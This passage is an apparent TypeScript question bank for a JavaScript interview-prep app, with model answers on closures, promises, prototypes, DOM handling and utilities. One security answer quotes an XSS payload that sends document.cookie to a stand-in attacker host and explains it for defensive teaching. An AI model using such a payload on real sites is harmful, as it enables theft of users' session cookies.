export type Difficulty = 'easy' | 'medium' | 'hard'
export type Category =
  | 'Closures & Scope'
  | 'Async & Promises'
  | 'Prototypes & OOP'
  | 'DOM & Browser'
  | 'ES6+'
  | 'Algorithms'
  | 'System Design'
  | 'Performance'

export const CATEGORIES: Category[] = [
  'Closures & Scope',
  'Async & Promises',
  'Prototypes & OOP',
  'DOM & Browser',
  'ES6+',
  'Algorithms',
  'System Design',
  'Performance',
]

export interface Question {
  id: string
  companies: string[]
  title: string
  difficulty: Difficulty
  category: Category
  description: string
  answer: string
  answerType: 'code' | 'text' | 'mixed'
  tags: string[]
  source?: string
}

export const COMPANIES = [
  { id: 'Google',  emoji: '🔵', color: '#4285F4' },
  { id: 'Meta',    emoji: '🔵', color: '#1877F2' },
  { id: 'Amazon',  emoji: '🟠', color: '#FF9900' },
  { id: 'Apple',   emoji: '⚫', color: '#A2AAAD' },
  { id: 'TikTok',  emoji: '⚫', color: '#EE1D52' },
  { id: 'Airbnb',  emoji: '🔴', color: '#FF5A5F' },
  { id: 'Netflix', emoji: '🔴', color: '#E50914' },
  { id: 'Stripe',  emoji: '🟣', color: '#635BFF' },
  { id: 'Uber',    emoji: '⚫', color: '#000000' },
  { id: 'DriveNets', emoji: '🟢', color: '#22C55E' },
]

export const QUESTIONS: Question[] = [
  // ── CLOSURES & SCOPE ─────────────────────────────────────────
  {
    id: 'debounce',
    companies: ['Google', 'Amazon', 'TikTok', 'Uber'],
    title: 'Implement debounce(fn, delay)',
    difficulty: 'medium',
    category: 'Closures & Scope',
    description: 'Write a `debounce` function that delays invoking `fn` until after `delay` ms have elapsed since the last call. Commonly used on search inputs and resize handlers.',
    answerType: 'code',
    tags: ['closures', 'timers', 'higher-order functions'],
    source: 'frontendinterviewhandbook.com',
    answer: `function debounce(fn, delay) {
  let timer = null

  return function (...args) {
    clearTimeout(timer)
    timer = setTimeout(() => {
      fn.apply(this, args)
    }, delay)
  }
}

// Usage
const search = debounce((query) => fetchResults(query), 300)
input.addEventListener('input', (e) => search(e.target.value))`,
  },
  {
    id: 'throttle',
    companies: ['Google', 'Amazon', 'Uber', 'TikTok'],
    title: 'Implement throttle(fn, delay)',
    difficulty: 'medium',
    category: 'Closures & Scope',
    description: 'Write a `throttle` function that ensures `fn` is called at most once per `delay` ms window, with a leading call and a trailing call guaranteed.',
    answerType: 'code',
    tags: ['closures', 'timers', 'performance'],
    source: 'frontendinterviewhandbook.com',
    answer: `function throttle(fn, delay) {
  let lastCall = 0
  let timer = null

  return function (...args) {
    const remaining = delay - (Date.now() - lastCall)
    clearTimeout(timer)

    if (remaining <= 0) {
      fn.apply(this, args)
      lastCall = Date.now()
    } else {
      // trailing call — always fire with the latest args
      timer = setTimeout(() => {
        fn.apply(this, args)
        lastCall = Date.now()
      }, remaining)
    }
  }
}

// Usage
const onScroll = throttle(() => {
  console.log('sync virtualized rows')
}, 100)
window.addEventListener('scroll', onScroll)`,
  },
  {
    id: 'memoize',
    companies: ['Google', 'Meta', 'Amazon'],
    title: 'Implement memoize(fn)',
    difficulty: 'medium',
    category: 'Closures & Scope',
    description: 'Write a `memoize` function that caches the results of function calls. Subsequent calls with the same arguments should return the cached result without re-running the function.',
    answerType: 'code',
    tags: ['closures', 'caching', 'performance'],
    answer: `function memoize(fn) {
  const cache = new Map()

  return function (...args) {
    const key = JSON.stringify(args)
    if (cache.has(key)) return cache.get(key)

    const result = fn.apply(this, args)
    cache.set(key, result)
    return result
  }
}

// Usage
function expensiveFib(n) {
  if (n <= 1) return n
  return expensiveFib(n - 1) + expensiveFib(n - 2)
}
const fib = memoize(expensiveFib)
fib(40) // computed
fib(40) // instant cache hit`,
  },
  {
    id: 'curry',
    companies: ['Meta', 'Google'],
    title: 'Implement curry(fn)',
    difficulty: 'hard',
    category: 'Closures & Scope',
    description: 'Write a `curry` function that transforms a multi-argument function into a sequence of unary functions. `curry(add)(1)(2)(3)` should equal `add(1, 2, 3)`.',
    answerType: 'code',
    tags: ['closures', 'functional programming', 'recursion'],
    source: 'frontendinterviewhandbook.com',
    answer: `function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args)
    }
    return function (...moreArgs) {
      return curried.apply(this, args.concat(moreArgs))
    }
  }
}

// Usage
function add(a, b, c) { return a + b + c }
const curriedAdd = curry(add)

curriedAdd(1)(2)(3)     // 6
curriedAdd(1, 2)(3)     // 6
curriedAdd(1)(2, 3)     // 6
curriedAdd(1, 2, 3)     // 6`,
  },
  {
    id: 'closures-explain',
    companies: ['Google', 'Meta', 'Amazon', 'Airbnb'],
    title: 'Explain closures — and the classic loop bug',
    difficulty: 'easy',
    category: 'Closures & Scope',
    description: 'What is a closure? Demonstrate the classic `var` loop bug and fix it using a closure, `let`, or IIFE.',
    answerType: 'code',
    tags: ['closures', 'var', 'let', 'scope'],
    answer: `// Usage
// A closure is a function that retains access to its outer
// (enclosing) scope even after the outer function has returned.

function makeCounter() {
  let count = 0              // captured by the returned function
  return () => ++count       // this is the closure
}
const counter = makeCounter()
counter() // 1
counter() // 2

// ─────────────────────────────────────────────────────────
// Classic loop bug with var
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100)
}
// Prints: 3, 3, 3  — all share the same 'i' variable

// Fix 1: use let (block-scoped, new binding per iteration)
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100)
}
// Prints: 0, 1, 2

// Fix 2: IIFE to capture each value
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 100)
  })(i)
}`,
  },
  {
    id: 'hoisting',
    companies: ['Amazon', 'Apple'],
    title: 'Explain hoisting',
    difficulty: 'easy',
    category: 'Closures & Scope',
    description: 'What is hoisting? How does it differ for `var`, `let`/`const`, and function declarations vs expressions?',
    answerType: 'code',
    tags: ['hoisting', 'var', 'tdz', 'function declarations'],
    answer: `// Usage
// Hoisting: declarations are moved to the top of their scope
// during the compile phase. Only the declaration is hoisted,
// not the initialisation.

// var — hoisted and initialised to undefined
console.log(x) // undefined (no error)
var x = 5
console.log(x) // 5

// let/const — hoisted but NOT initialised (Temporal Dead Zone)
console.log(y) // ReferenceError: Cannot access 'y' before init
let y = 10

// Function declarations — fully hoisted (name + body)
greet() // "Hello!" — works before the declaration
function greet() { console.log('Hello!') }

// Function expressions — only the variable is hoisted
sayHi() // TypeError: sayHi is not a function
var sayHi = function() { console.log('Hi!') }

// Key rule: prefer const/let and declare before use.`,
  },

  // ── ASYNC & PROMISES ─────────────────────────────────────────
  {
    id: 'promise-all',
    companies: ['Meta', 'TikTok', 'Apple', 'Amazon'],
    title: 'Implement Promise.all(promises)',
    difficulty: 'medium',
    category: 'Async & Promises',
    description: 'Implement `Promise.all` from scratch. It should resolve with an array of results when all promises resolve, and reject immediately if any promise rejects.',
    answerType: 'code',
    tags: ['promises', 'async', 'concurrency'],
    source: 'frontendinterviewhandbook.com',
    answer: `function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    if (promises.length === 0) return resolve([])

    const results = new Array(promises.length)
    let remaining = promises.length

    promises.forEach((promise, i) => {
      Promise.resolve(promise).then((value) => {
        results[i] = value
        remaining -= 1
        if (remaining === 0) resolve(results)
      }).catch(reject)   // first rejection wins
    })
  })
}

// Test
promiseAll([
  Promise.resolve(1),
  Promise.resolve(2),
  Promise.resolve(3),
]).then(console.log)  // [1, 2, 3]

promiseAll([
  Promise.resolve(1),
  Promise.reject('error'),
]).catch(console.error) // 'error'`,
  },
  {
    id: 'promise-allsettled',
    companies: ['Meta', 'Google'],
    title: 'Implement Promise.allSettled(promises)',
    difficulty: 'medium',
    category: 'Async & Promises',
    description: 'Implement `Promise.allSettled` — unlike `Promise.all`, it waits for all promises and returns an array of `{ status, value/reason }` objects, never rejecting.',
    answerType: 'code',
    tags: ['promises', 'async'],
    answer: `function promiseAllSettled(promises) {
  return Promise.all(
    promises.map(p =>
      Promise.resolve(p)
        .then(value  => ({ status: 'fulfilled', value }))
        .catch(reason => ({ status: 'rejected',  reason }))
    )
  )
}

// Test
promiseAllSettled([
  Promise.resolve(1),
  Promise.reject('oops'),
  Promise.resolve(3),
]).then(console.log)
// [
//   { status: 'fulfilled', value: 1 },
//   { status: 'rejected',  reason: 'oops' },
//   { status: 'fulfilled', value: 3 },
// ]`,
  },
  {
    id: 'promises-sequence',
    companies: ['Apple', 'Amazon', 'Stripe'],
    title: 'Execute an array of async tasks in sequence',
    difficulty: 'medium',
    category: 'Async & Promises',
    description: 'Given an array of async functions (each returning a Promise), execute them one after another — not concurrently — and collect the results.',
    answerType: 'code',
    tags: ['promises', 'async', 'reduce'],
    answer: `// Using Array.reduce
function runSequential(tasks) {
  return tasks.reduce(
    (chain, task) => chain.then(results =>
      task().then(value => [...results, value])
    ),
    Promise.resolve([])
  )
}

// Using async/await (often cleaner in interviews)
async function runSequential(tasks) {
  const results = []
  for (const task of tasks) {
    results.push(await task())
  }
  return results
}

// Test
const tasks = [
  () => Promise.resolve(1),
  () => new Promise(res => setTimeout(() => res(2), 100)),
  () => Promise.resolve(3),
]
runSequential(tasks).then(console.log) // [1, 2, 3]`,
  },
  {
    id: 'event-loop',
    companies: ['Amazon', 'Uber', 'Google'],
    title: 'Explain the Event Loop — what is the output order?',
    difficulty: 'medium',
    category: 'Async & Promises',
    description: 'Explain the JavaScript event loop, call stack, microtask queue, and macrotask queue. What order does the following code execute?',
    answerType: 'code',
    tags: ['event loop', 'microtasks', 'macrotasks', 'promises'],
    answer: `// Usage
// Use this pattern to reason about callback ordering in bug reports.
console.log('1')               // sync — runs first

setTimeout(() => {
  console.log('2')             // macrotask — runs last
}, 0)

Promise.resolve().then(() => {
  console.log('3')             // microtask — runs before macrotask
})

console.log('4')               // sync — runs second

// Output: 1, 4, 3, 2

// ─────────────────────────────────────────────────────────
// How it works:
// 1. Synchronous code runs on the call stack first.
// 2. After the stack clears, ALL microtasks run (Promise
//    .then, queueMicrotask, MutationObserver).
// 3. Then ONE macrotask runs (setTimeout, setInterval,
//    I/O, UI rendering).
// 4. After that macrotask, microtasks flush again.
// 5. Repeat.

// Key: microtasks always drain before the next macrotask.`,
  },

  // ── PROTOTYPES & OOP ─────────────────────────────────────────
  {
    id: 'implement-bind',
    companies: ['TikTok', 'Apple', 'Meta'],
    title: 'Implement Function.prototype.bind',
    difficulty: 'medium',
    category: 'Prototypes & OOP',
    description: 'Implement your own version of `Function.prototype.bind`. It should return a new function with `this` permanently bound and support partial application. Bonus: handle `new` correctly.',
    answerType: 'code',
    tags: ['this', 'prototype', 'bind', 'new'],
    source: 'frontendinterviewhandbook.com',
    answer: `Function.prototype.myBind = function(thisArg, ...boundArgs) {
  const fn = this  // the original function

  return function bound(...callArgs) {
    // When used with 'new', ignore the bound 'this'
    if (new.target) {
      return new fn(...boundArgs, ...callArgs)
    }
    return fn.apply(thisArg, [...boundArgs, ...callArgs])
  }
}

// Usage
function greet(greeting, punctuation) {
  return \`\${greeting}, \${this.name}\${punctuation}\`
}

const user = { name: 'Alice' }
const sayHi = greet.myBind(user, 'Hello')
sayHi('!')   // "Hello, Alice!"
sayHi('?')   // "Hello, Alice?"`,
  },
  {
    id: 'event-emitter',
    companies: ['TikTok', 'Meta', 'Airbnb'],
    title: 'Implement an EventEmitter class',
    difficulty: 'medium',
    category: 'Prototypes & OOP',
    description: 'Implement a Node.js-style `EventEmitter` with `on`, `off`, `emit`, and `once` methods.',
    answerType: 'code',
    tags: ['classes', 'observer pattern', 'events'],
    source: 'frontendinterviewhandbook.com',
    answer: `class EventEmitter {
  constructor() {
    this._events = {}
  }

  on(event, listener) {
    if (!this._events[event]) this._events[event] = []
    this._events[event].push(listener)
    return this  // for chaining
  }

  off(event, listener) {
    if (!this._events[event]) return this
    this._events[event] = this._events[event]
      .filter(l => l !== listener && l._original !== listener)
    return this
  }

  emit(event, ...args) {
    if (!this._events[event]) return false
    this._events[event].forEach(listener => listener(...args))
    return true
  }

  once(event, listener) {
    const wrapper = (...args) => {
      listener(...args)
      this.off(event, wrapper)
    }
    wrapper._original = listener
    return this.on(event, wrapper)
  }
}

// Usage
const emitter = new EventEmitter()
emitter.on('data', (msg) => console.log('received:', msg))
emitter.once('connect', () => console.log('connected!'))

emitter.emit('connect')  // "connected!"
emitter.emit('connect')  // (nothing — once removed itself)
emitter.emit('data', 'hello')  // "received: hello"`,
  },
  {
    id: 'this-binding',
    companies: ['Google', 'Amazon', 'Meta'],
    title: 'Explain `this` — 4 binding rules',
    difficulty: 'medium',
    category: 'Prototypes & OOP',
    description: 'Describe the four rules that determine the value of `this` in JavaScript: default, implicit, explicit, and `new` binding. What does each of these log?',
    answerType: 'code',
    tags: ['this', 'binding', 'arrow functions'],
    answer: `// Usage
// Use this checklist whenever "this" is unexpected in handlers/classes.
// 1. Default binding — 'this' is globalThis (undefined in strict)
function show() { console.log(this) }
show()  // window / undefined (strict)

// 2. Implicit binding — 'this' is the object before the dot
const obj = { name: 'Alice', greet() { console.log(this.name) } }
obj.greet()  // "Alice"
const fn = obj.greet
fn()         // undefined — lost implicit binding!

// 3. Explicit binding — call / apply / bind
function greet() { console.log(this.name) }
greet.call({ name: 'Bob' })   // "Bob"
greet.apply({ name: 'Carol'}) // "Carol"
const bound = greet.bind({ name: 'Dave' })
bound()                        // "Dave"

// 4. new binding — 'this' is the newly created object
function Person(name) { this.name = name }
const p = new Person('Eve')
console.log(p.name) // "Eve"

// Arrow functions — no own 'this', inherit from lexical scope
const counter = {
  count: 0,
  start() {
    setInterval(() => {
      this.count++ // 'this' is counter, not the interval callback
    }, 1000)
  }
}`,
  },
  {
    id: 'prototypal-inheritance',
    companies: ['Google', 'Amazon'],
    title: 'Explain prototypal inheritance',
    difficulty: 'medium',
    category: 'Prototypes & OOP',
    description: 'How does the prototype chain work in JavaScript? Implement inheritance using both the classic prototype pattern and ES6 classes.',
    answerType: 'code',
    tags: ['prototype', 'inheritance', 'classes', '__proto__'],
    answer: `// Usage
// Use inheritance for shared behavior and polymorphism.
// Every object has a [[Prototype]] link to another object.
// Property lookup walks up the chain until null is reached.

// ── ES6 classes (syntactic sugar over prototypes) ──
class Animal {
  constructor(name) { this.name = name }
  speak() { return \`\${this.name} makes a noise.\` }
}

class Dog extends Animal {
  speak() { return \`\${this.name} barks.\` }
}

const d = new Dog('Rex')
d.speak()              // "Rex barks."
d instanceof Dog       // true
d instanceof Animal    // true

// ── Same thing with raw prototypes ──
function Animal(name) { this.name = name }
Animal.prototype.speak = function() {
  return \`\${this.name} makes a noise.\`
}

function Dog(name) { Animal.call(this, name) }
Dog.prototype = Object.create(Animal.prototype)
Dog.prototype.constructor = Dog
Dog.prototype.speak = function() {
  return \`\${this.name} barks.\`
}

// ── Object.create for pure prototype chains ──
const animal = { speak() { return 'noise' } }
const dog = Object.create(animal)
dog.speak() // "noise" — found on animal via prototype chain`,
  },

  // ── ALGORITHMS ───────────────────────────────────────────────
  {
    id: 'deep-clone',
    companies: ['TikTok', 'Airbnb', 'Google'],
    title: 'Deep clone an object',
    difficulty: 'medium',
    category: 'Algorithms',
    description: 'Write a `deepClone` function that creates a complete deep copy of a value, handling nested objects, arrays, dates, null, and circular references.',
    answerType: 'code',
    tags: ['recursion', 'objects', 'cloning'],
    source: 'frontendinterviewhandbook.com',
    answer: `// Production approach (handles most cases)
function deepClone(value, seen = new WeakMap()) {
  if (value === null || typeof value !== 'object') return value
  if (value instanceof Date) return new Date(value)
  if (value instanceof RegExp) return new RegExp(value)

  // Handle circular references
  if (seen.has(value)) return seen.get(value)

  const clone = Array.isArray(value) ? [] : {}
  seen.set(value, clone)

  for (const key of Object.keys(value)) {
    clone[key] = deepClone(value[key], seen)
  }
  return clone
}

// Usage
const obj = { a: 1, b: { c: [1, 2, 3] }, d: new Date() }
const copy = deepClone(obj)
copy.b.c.push(4)
console.log(obj.b.c)   // [1, 2, 3] — original untouched

// Quick alternative for plain data (no Date, no undefined, no circular)
const quick = JSON.parse(JSON.stringify(obj))

// Modern: structuredClone (native, handles most types)
const native = structuredClone(obj)`,
  },
  {
    id: 'flatten-array',
    companies: ['Meta', 'Amazon', 'Apple', 'TikTok'],
    title: 'Implement Array.prototype.flat',
    difficulty: 'easy',
    category: 'Algorithms',
    description: 'Implement `flat(arr, depth)` that flattens a nested array to the given depth. Also implement `Array.prototype.flat` on the prototype.',
    answerType: 'code',
    tags: ['arrays', 'recursion', 'prototype'],
    source: 'frontendinterviewhandbook.com',
    answer: `// Recursive implementation
function flat(arr, depth = 1) {
  if (depth === 0) return arr.slice()

  return arr.reduce((result, item) => {
    if (Array.isArray(item) && depth > 0) {
      result.push(...flat(item, depth - 1))
    } else {
      result.push(item)
    }
    return result
  }, [])
}

// Polyfill on Array.prototype
Array.prototype.myFlat = function(depth = 1) {
  return flat(this, depth)
}

// Tests
flat([1, [2, [3, [4]]]])          // [1, 2, [3, [4]]]
flat([1, [2, [3, [4]]]], 2)       // [1, 2, 3, [4]]
flat([1, [2, [3, [4]]]], Infinity) // [1, 2, 3, 4]

// One-liner alternatives
const flatAlt = (arr, d = 1) =>
  d > 0
    ? arr.reduce((a, v) => a.concat(Array.isArray(v) ? flatAlt(v, d - 1) : v), [])
    : arr.slice()`,
  },
  {
    id: 'classnames',
    companies: ['Meta'],
    title: 'Implement classnames()',
    difficulty: 'easy',
    category: 'Algorithms',
    description: 'Implement the popular `classnames` utility that conditionally joins class names. It should handle strings, objects, arrays, and falsy values.',
    answerType: 'code',
    tags: ['utility', 'string manipulation'],
    source: 'frontendinterviewhandbook.com — Meta',
    answer: `function classnames(...args) {
  const classes = []

  for (const arg of args) {
    if (!arg) continue  // skip falsy values

    if (typeof arg === 'string' || typeof arg === 'number') {
      classes.push(arg)
    } else if (Array.isArray(arg)) {
      const inner = classnames(...arg)
      if (inner) classes.push(inner)
    } else if (typeof arg === 'object') {
      for (const [key, value] of Object.entries(arg)) {
        if (value) classes.push(key)
      }
    }
  }

  return classes.join(' ')
}

// Usage
classnames('foo', 'bar')               // "foo bar"
classnames('foo', { bar: true })       // "foo bar"
classnames({ foo: true, bar: false })  // "foo"
classnames('foo', ['bar', 'baz'])      // "foo bar baz"
classnames(null, undefined, 0, false)  // ""`,
  },
  {
    id: 'lru-cache',
    companies: ['Google', 'Amazon', 'Netflix'],
    title: 'Implement an LRU Cache',
    difficulty: 'hard',
    category: 'Algorithms',
    description: 'Design a Least Recently Used (LRU) Cache with `get(key)` and `put(key, value)` operations, both O(1). When capacity is exceeded, evict the least recently used entry.',
    answerType: 'code',
    tags: ['data structures', 'Map', 'linked list', 'O(1)'],
    answer: `class LRUCache {
  constructor(capacity) {
    this.capacity = capacity
    this.cache = new Map()   // Map preserves insertion order
  }

  get(key) {
    if (!this.cache.has(key)) return -1

    // Move to end (most recently used)
    const value = this.cache.get(key)
    this.cache.delete(key)
    this.cache.set(key, value)
    return value
  }

  put(key, value) {
    if (this.cache.has(key)) this.cache.delete(key)
    else if (this.cache.size >= this.capacity) {
      // Delete least recently used (first key in Map)
      this.cache.delete(this.cache.keys().next().value)
    }
    this.cache.set(key, value)
  }
}

// Test
const lru = new LRUCache(2)
lru.put(1, 1)
lru.put(2, 2)
lru.get(1)     // 1   — 1 is now most recently used
lru.put(3, 3)  // evicts key 2
lru.get(2)     // -1  — evicted
lru.get(3)     // 3`,
  },

  // ── DOM & BROWSER ────────────────────────────────────────────
  {
    id: 'virtual-dom',
    companies: ['Meta', 'Google'],
    title: 'Convert a virtual DOM object into real DOM',
    difficulty: 'hard',
    category: 'DOM & Browser',
    description: 'Given a JSON object representing a virtual DOM tree (`{ type, props, children }`), write a function that creates the corresponding actual DOM elements recursively.',
    answerType: 'code',
    tags: ['DOM', 'recursion', 'virtual DOM'],
    source: 'javascript.plainenglish.io — Meta',
    answer: `/*
  Input shape:
  {
    type: 'div',
    props: { class: 'container', id: 'app' },
    children: [
      { type: 'h1', props: {}, children: ['Hello World'] },
      { type: 'p',  props: { class: 'text' }, children: ['Paragraph'] }
    ]
  }
*/

function createElement(vnode) {
  // Text node
  if (typeof vnode === 'string' || typeof vnode === 'number') {
    return document.createTextNode(String(vnode))
  }

  const { type, props = {}, children = [] } = vnode
  const el = document.createElement(type)

  // Set attributes / props
  for (const [key, value] of Object.entries(props)) {
    if (key === 'className') el.setAttribute('class', value)
    else if (key.startsWith('on')) {
      el.addEventListener(key.slice(2).toLowerCase(), value)
    } else {
      el.setAttribute(key, value)
    }
  }

  // Recursively create children
  for (const child of children) {
    el.appendChild(createElement(child))
  }

  return el
}

// Usage (Mount)
document.body.appendChild(createElement({
  type: 'ul',
  props: { class: 'list' },
  children: [
    { type: 'li', props: {}, children: ['Item 1'] },
    { type: 'li', props: {}, children: ['Item 2'] },
  ]
}))`,
  },
  {
    id: 'event-delegation',
    companies: ['Amazon', 'Stripe', 'Google'],
    title: 'Explain event delegation — implement it',
    difficulty: 'easy',
    category: 'DOM & Browser',
    description: 'What is event delegation and why is it useful? Implement a delegated click handler on a dynamic list.',
    answerType: 'code',
    tags: ['events', 'bubbling', 'delegation', 'performance'],
    answer: `// Usage
// Event delegation = attach ONE listener to a parent instead
// of many listeners on individual children.
// Works because events bubble up the DOM tree.

// ✗ Bad: listener on every item (expensive, misses dynamic items)
document.querySelectorAll('.item').forEach(item => {
  item.addEventListener('click', handleClick)
})

// ✓ Good: single listener on the parent
document.querySelector('.list').addEventListener('click', (e) => {
  const item = e.target.closest('.item')
  if (!item) return               // click wasn't on an item

  const id = item.dataset.id
  console.log('Clicked item:', id)
})

// Advantages:
// 1. One listener instead of N — less memory
// 2. Works for dynamically added children automatically
// 3. Easier to manage (add/remove in one place)

// Custom delegate utility
function delegate(parent, selector, event, handler) {
  parent.addEventListener(event, (e) => {
    const target = e.target.closest(selector)
    if (target && parent.contains(target)) {
      handler.call(target, e)
    }
  })
}`,
  },
  {
    id: 'xss-csrf',
    companies: ['Google'],
    title: 'XSS vs CSRF — how do you prevent them?',
    difficulty: 'medium',
    category: 'DOM & Browser',
    description: 'Explain Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF). How does each attack work, and what are the mitigations?',
    answerType: 'mixed',
    tags: ['security', 'XSS', 'CSRF', 'CSP'],
    source: 'frontendinterviewhandbook.com — Google',
    answer: `// Usage
// Apply these rules for all user-generated content and state-changing APIs.
// XSS — attacker injects malicious scripts into your page
// ────────────────────────────────────────────────────────
// Attack: <img src=x onerror="fetch('evil.com?c='+document.cookie)">
// Mitigations:
//  1. Escape/sanitise ALL user input before rendering to HTML
//  2. Content Security Policy (CSP) header to whitelist sources
//  3. HttpOnly cookies (JS can't read them)
//  4. Use textContent instead of innerHTML
//  5. DOMPurify library for rich-text HTML

// ❌ Vulnerable
el.innerHTML = userInput                      // dangerous
// ✅ Safe
el.textContent = userInput                    // auto-escaped
el.innerHTML = DOMPurify.sanitize(userInput)  // if HTML needed

// ─────────────────────────────────────────────────────────
// CSRF — attacker tricks the browser into making auth'd requests
// Attack: evil.com has a hidden form that POSTs to bank.com/transfer
// Your browser sends the session cookie automatically.
// Mitigations:
//  1. CSRF tokens (server issues random token, validates on POST)
//  2. SameSite=Strict/Lax cookie attribute
//  3. Check Origin/Referer header on the server
//  4. Require re-authentication for sensitive actions

// Key difference:
// XSS = attacker runs code IN your site (trust issue with input)
// CSRF = attacker makes your browser make requests TO your site`,
  },
  {
    id: 'localstorage-vs-cookies',
    companies: ['TikTok', 'Amazon'],
    title: 'localStorage vs sessionStorage vs cookies',
    difficulty: 'easy',
    category: 'DOM & Browser',
    description: 'Compare the three browser storage mechanisms: localStorage, sessionStorage, and cookies — covering size limits, persistence, security, and server access.',
    answerType: 'mixed',
    tags: ['storage', 'cookies', 'security', 'browser APIs'],
    answer: `//                localStorage  sessionStorage  cookies
// ─────────────────────────────────────────────────────────
// Capacity       ~5 MB         ~5 MB           ~4 KB
// Persistence    Until cleared  Tab close       Configurable (Expires/Max-Age)
// Sent to server No             No              Yes (every request — overhead)
// JS accessible  Yes            Yes             Yes (unless HttpOnly)
// Shared across  All tabs       Same tab only   All tabs (same origin)
// tabs

// When to use what:
// cookies  — session tokens, auth state (set HttpOnly + Secure + SameSite)
// localStorage  — user preferences, themes, non-sensitive app state
// sessionStorage — wizard step state, temp form data

// Security rules:
// • Never store tokens in localStorage if XSS is a risk
// • Always set HttpOnly on auth cookies (prevents JS access)
// • Set Secure so cookies only travel over HTTPS
// • Set SameSite=Strict/Lax to prevent CSRF

// Usage
localStorage.setItem('theme', 'dark')
const theme = localStorage.getItem('theme')
localStorage.removeItem('theme')
localStorage.clear()

// Cookies
document.cookie = 'name=value; SameSite=Strict; Secure; path=/'`,
  },

  // ── ES6+ ─────────────────────────────────────────────────────
  {
    id: 'var-let-const',
    companies: ['Amazon', 'Apple'],
    title: '`var` vs `let` vs `const`',
    difficulty: 'easy',
    category: 'ES6+',
    description: 'What are the differences between `var`, `let`, and `const`? Cover scoping, hoisting, re-declaration, and the temporal dead zone.',
    answerType: 'code',
    tags: ['var', 'let', 'const', 'scope', 'tdz'],
    answer: `// Usage
//           var           let             const
// ─────────────────────────────────────────────────────────
// Scope     function      block           block
// Hoisted   yes (undef)   yes (TDZ err)   yes (TDZ err)
// Re-decl   yes           no              no
// Re-assign yes           yes             no (binding)

// var — function scoped, leaks out of blocks
function example() {
  if (true) {
    var x = 1    // accessible outside the if block
    let y = 2    // block-scoped
  }
  console.log(x) // 1
  console.log(y) // ReferenceError
}

// const — binding is constant, object properties can change
const arr = [1, 2, 3]
arr.push(4)   // ✅ mutating is fine
arr = []      // ❌ TypeError: assignment to constant variable

// Temporal Dead Zone (TDZ)
console.log(a) // undefined (var hoisted + init'd)
console.log(b) // ReferenceError (let in TDZ)
var a = 1
let b = 2

// Best practice: default to const, use let when reassignment
// is needed, avoid var in modern code.`,
  },
  {
    id: 'equality',
    companies: ['Amazon', 'Google'],
    title: '`==` vs `===` — type coercion rules',
    difficulty: 'easy',
    category: 'ES6+',
    description: 'What is the difference between `==` (loose equality) and `===` (strict equality)? Give examples of surprising `==` coercion behaviour.',
    answerType: 'code',
    tags: ['coercion', 'equality', 'types'],
    answer: `// Usage
// === strict equality: no type coercion
1 === 1        // true
1 === '1'      // false — different types
null === null  // true
null === undefined // false

// == loose equality: coerces types (follow Abstract Equality algo)
1 == '1'       // true  (string → number)
0 == false     // true  (false → 0)
0 == ''        // true  ('' → 0)
null == undefined  // true  (special rule)
null == 0      // false (null only == undefined)
NaN == NaN     // false (NaN is never equal to anything)

// Surprising cases
[] == false    // true  ([] → '' → 0, false → 0)
[] == ![]      // true  (![] is false, [] coerces to 0)
'' == false    // true

// Rule of thumb: always use ===
// Exceptions: null == undefined is a common idiom to check
// for "neither null nor undefined" in one check:
function isNullish(val) {
  return val == null  // catches both null and undefined
}`,
  },
  {
    id: 'array-map',
    companies: ['Apple'],
    title: 'Implement Array.prototype.map from scratch',
    difficulty: 'easy',
    category: 'ES6+',
    description: 'Implement `Array.prototype.myMap` that behaves identically to the native `Array.prototype.map`. Handle sparse arrays and the `thisArg` parameter.',
    answerType: 'code',
    tags: ['arrays', 'prototype', 'higher-order functions'],
    source: 'frontendinterviewhandbook.com — Apple',
    answer: `Array.prototype.myMap = function(callback, thisArg) {
  if (typeof callback !== 'function') {
    throw new TypeError(callback + ' is not a function')
  }

  const result = new Array(this.length)

  for (let i = 0; i < this.length; i++) {
    // Skip holes in sparse arrays (same as native map)
    if (Object.prototype.hasOwnProperty.call(this, i)) {
      result[i] = callback.call(thisArg, this[i], i, this)
    }
  }

  return result
}

// Test
;[1, 2, 3].myMap(x => x * 2)       // [2, 4, 6]
;[1, 2, 3].myMap((x, i) => i + x)  // [1, 3, 5]

// With thisArg
const multiplier = { factor: 3 }
;[1, 2, 3].myMap(function(x) {
  return x * this.factor
}, multiplier)   // [3, 6, 9]`,
  },
  {
    id: 'array-reduce',
    companies: ['Apple', 'Meta'],
    title: 'Implement Array.prototype.reduce from scratch',
    difficulty: 'medium',
    category: 'ES6+',
    description: 'Implement `Array.prototype.myReduce` that behaves identically to the native `reduce`. Handle both the case where an initial value is provided and when it is not.',
    answerType: 'code',
    tags: ['arrays', 'prototype', 'accumulator'],
    source: 'frontendinterviewhandbook.com — Apple',
    answer: `Array.prototype.myReduce = function(callback, initialValue) {
  if (typeof callback !== 'function') {
    throw new TypeError(callback + ' is not a function')
  }

  const arr = this
  let accumulator
  let startIndex

  if (arguments.length >= 2) {
    accumulator = initialValue
    startIndex = 0
  } else {
    if (arr.length === 0) {
      throw new TypeError('Reduce of empty array with no initial value')
    }
    accumulator = arr[0]
    startIndex = 1
  }

  for (let i = startIndex; i < arr.length; i++) {
    if (Object.prototype.hasOwnProperty.call(arr, i)) {
      accumulator = callback(accumulator, arr[i], i, arr)
    }
  }

  return accumulator
}

// Tests
;[1, 2, 3, 4].myReduce((acc, x) => acc + x, 0)  // 10
;[1, 2, 3, 4].myReduce((acc, x) => acc + x)      // 10
;['a','b','c'].myReduce((acc, x) => acc + x)      // "abc"`,
  },

  // ── PERFORMANCE ──────────────────────────────────────────────
  {
    id: 'compose-middleware',
    companies: ['TikTok', 'Stripe'],
    title: 'Implement compose / middleware pipeline',
    difficulty: 'hard',
    category: 'Performance',
    description: 'Implement a `compose` function (right-to-left) and a Koa/Express-style `applyMiddleware` that chains async middleware with `next()`. This is the core of most web framework middleware systems.',
    answerType: 'code',
    tags: ['functional programming', 'middleware', 'async', 'compose'],
    source: 'frontendinterviewhandbook.com — TikTok',
    answer: `// compose(f, g, h)(x) = f(g(h(x))) — right to left
function compose(...fns) {
  return (x) => fns.reduceRight((acc, fn) => fn(acc), x)
}

// pipe(f, g, h)(x) = h(g(f(x))) — left to right
